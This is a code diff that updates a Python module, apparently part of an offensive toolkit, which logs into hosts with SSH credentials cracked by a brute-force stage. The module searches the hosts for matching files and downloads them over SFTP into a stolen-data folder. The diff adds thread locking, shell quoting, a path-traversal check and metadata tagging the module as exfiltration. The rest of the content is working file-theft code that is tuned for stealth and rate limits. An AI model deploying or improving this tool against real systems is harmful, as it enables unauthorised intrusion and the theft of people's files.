@@ -1,23 +1,11 @@
-"""
-steal_files_ssh.py — SSH file looter (DB-backed)
-
-SQL mode:
-- Orchestrator provides (ip, port) and ensures parent action success (SSHBruteforce).
-- SSH credentials are read from the DB table `creds` (service='ssh').
-- IP -> (MAC, hostname) mapping is read from the DB table `hosts`.
-- Looted files are saved under: {shared_data.data_stolen_dir}/ssh/{mac}_{ip}/...
-- Paramiko logs are silenced to avoid noisy banners/tracebacks.
-
-Parent gate:
-- Orchestrator enforces parent success (b_parent='SSHBruteforce').
-- This action runs once per eligible target (alive, open port, parent OK).
-"""
+"""steal_files_ssh.py - Loot files over SSH/SFTP using cracked credentials."""
 
 import os
+import shlex
 import time
 import logging
 import paramiko
-from threading import Timer
+from threading import Timer, Lock
 from typing import List, Tuple, Dict, Optional
 
 from shared import SharedData
@@ -35,7 +23,7 @@ b_module       = "steal_files_ssh"      # Python module name (this file without 
 b_status       = "steal_files_ssh"      # Human/readable status key (free form)
 
 b_action       = "normal"               # 'normal' (per-host) or 'global'
-b_service      = ["ssh"]                # Services this action is about (JSON-ified by sync_actions)
+b_service      = '["ssh"]'             # Services this action is about (JSON string for AST parser)
 b_port         = 22                     # Preferred target port (used if present on host)
 
 # Trigger strategy:
@@ -61,6 +49,13 @@ b_rate_limit   = "3/86400"              # at most 3 executions/day per host (ext
 b_stealth_level = 6                     # 1..10 (higher = more stealthy)
 b_risk_level    = "high"                # 'low' | 'medium' | 'high'
 b_enabled       = 1                     # set to 0 to disable from DB sync
+b_tags = ["exfil", "ssh", "sftp", "loot", "files"]
+b_category = "exfiltration"
+b_name = "Steal Files SSH"
+b_description = "Loot files over SSH/SFTP using cracked credentials."
+b_author = "Bjorn Team"
+b_version = "2.0.0"
+b_icon = "StealFilesSSH.png"
 
 # Tags (free taxonomy, JSON-ified by sync_actions)
 b_tags         = ["exfil", "ssh", "loot"]
@@ -71,6 +66,7 @@ class StealFilesSSH:
     def __init__(self, shared_data: SharedData):
         """Init: store shared_data, flags, and build an IP->(MAC, hostname) cache."""
         self.shared_data = shared_data
+        self._state_lock = Lock()     # protects sftp_connected / stop_execution
         self.sftp_connected = False   # flipped to True on first SFTP open
         self.stop_execution = False   # global kill switch (timer / orchestrator exit)
         self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
@@ -194,8 +190,8 @@ class StealFilesSSH:
           - shared_data.steal_file_names     (substring match)
         Uses `find <dir> -type f 2>/dev/null` to keep it quiet.
         """
-        # Quiet 'permission denied' messages via redirection
-        cmd = f'find {dir_path} -type f 2>/dev/null'
+        # Quiet 'permission denied' messages via redirection; escape dir_path to prevent injection
+        cmd = f'find {shlex.quote(dir_path)} -type f 2>/dev/null'
         stdin, stdout, stderr = ssh.exec_command(cmd)
         files = (stdout.read().decode(errors="ignore") or "").splitlines()
 
@@ -203,7 +199,7 @@ class StealFilesSSH:
         names = set(self.shared_data.steal_file_names or [])
         if not exts and not names:
             # If no filters are defined, do nothing (too risky to pull everything).
-            logger.warning("No steal_file_extensions / steal_file_names configured — skipping.")
+            logger.warning("No steal_file_extensions / steal_file_names configured - skipping.")
             return []
 
         matches: List[str] = []
@@ -218,7 +214,7 @@ class StealFilesSSH:
         logger.info(f"Found {len(matches)} matching files in {dir_path}")
         return matches
 
-    # Max file size to download (10 MB) — protects RPi Zero RAM
+    # Max file size to download (10 MB) - protects RPi Zero RAM
     _MAX_FILE_SIZE = 10 * 1024 * 1024
 
     def steal_file(self, ssh: paramiko.SSHClient, remote_file: str, local_dir: str) -> None:
@@ -227,7 +223,8 @@ class StealFilesSSH:
         Skips files larger than _MAX_FILE_SIZE to protect RPi Zero memory.
         """
         sftp = ssh.open_sftp()
-        self.sftp_connected = True  # first time we open SFTP, mark as connected
+        with self._state_lock:
+            self.sftp_connected = True  # first time we open SFTP, mark as connected
 
         try:
             # Check file size before downloading
@@ -235,7 +232,7 @@ class StealFilesSSH:
                 st = sftp.stat(remote_file)
                 if st.st_size and st.st_size > self._MAX_FILE_SIZE:
                     logger.info(f"Skipping {remote_file} ({st.st_size} bytes > {self._MAX_FILE_SIZE} limit)")
-                    return
+                    return  # finally block still runs and closes sftp
             except Exception:
                 pass  # stat failed, try download anyway
 
@@ -245,6 +242,14 @@ class StealFilesSSH:
             os.makedirs(local_file_dir, exist_ok=True)
 
             local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
+
+            # Path traversal guard: ensure we stay within local_dir
+            abs_local = os.path.realpath(local_file_path)
+            abs_base = os.path.realpath(local_dir)
+            if not abs_local.startswith(abs_base + os.sep) and abs_local != abs_base:
+                logger.warning(f"Path traversal blocked: {remote_file} -> {abs_local}")
+                return
+
             sftp.get(remote_file, local_file_path)
 
             logger.success(f"Downloaded: {remote_file}  ->  {local_file_path}")
@@ -286,9 +291,10 @@ class StealFilesSSH:
 
             # Define a timer: if we never establish SFTP in 4 minutes, abort
             def _timeout():
-                if not self.sftp_connected:
-                    logger.error(f"No SFTP connection established within 4 minutes for {ip}. Marking as failed.")
-                    self.stop_execution = True
+                with self._state_lock:
+                    if not self.sftp_connected:
+                        logger.error(f"No SFTP connection established within 4 minutes for {ip}. Marking as failed.")
+                        self.stop_execution = True
 
             timer = Timer(240, _timeout)
             timer.start()
